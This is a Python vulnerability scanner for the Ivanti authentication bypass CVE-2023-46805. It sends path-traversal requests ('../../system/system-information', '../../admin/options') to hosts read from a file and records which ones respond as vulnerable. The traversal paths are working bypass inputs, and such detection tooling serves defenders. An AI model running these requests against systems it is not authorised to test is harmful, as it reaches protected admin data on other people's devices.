import requests
import urllib3
import csv
urllib3.disable_warnings()

print("\033[94m===================================")
print("Ivanti Scanner CVE-2023-46805 updated 19/01/2024")
print("       by @ChristiaanBeek    ")
print("===================================\033[0m")

ENDPOINTS = [
    "/api/v1/totp/user-backup-code/../../system/system-information",
    "/api/v1/cav/client/status/../../admin/options",
    "/api/v1/configuration/users/user-roles/user-role/rest-userrole1/web/web-bookmarks/bookmark"
]

# Function to check vulnerability
def check_vulnerability(ip, endpoint):
    url = f"https://{ip}{endpoint}"
    try:
        response = requests.get(url, verify=False, timeout=3)
        if endpoint == ENDPOINTS[2]:  # For the third endpoint
            if response.headers.get('content-type') is None:
                return "Vulnerable Ivanti Device!"
            else:
                return "Not Vulnerable or Different Response"
        else:
            if response.status_code == 200 and response.headers.get('content-type') == 'application/json':
                response_data = response.json()
                if response_data == {"poll_interval": 300, "block_message": ""}:
                    return "Vulnerable Ivanti Device!"
                else:
                    return "XML Mitigation Applied!"
    except Exception as e:
        return "Connection error"
    return "Not Vulnerable or Different Response"

# Read IP addresses from a text file
with open('ip_list.txt', 'r') as file:
    ip_addresses = file.read().splitlines()

with open('output.csv', 'w', newline='') as csv_file:
    writer = csv.writer(csv_file)
    writer.writerow(["IP Address", "Status"])

    for ip_san in ip_addresses:
        statuses = [check_vulnerability(ip_san, endpoint) for endpoint in ENDPOINTS]
        if "Vulnerable Ivanti Device!" in statuses:
            final_status = "Vulnerable Ivanti Device!"
        elif "XML Mitigation Applied!" in statuses:
            final_status = "XML Mitigation Applied!"
        else:
            final_status = "Not Vulnerable or Different Response"

        print(ip_san, final_status)
        writer.writerow([ip_san, final_status])

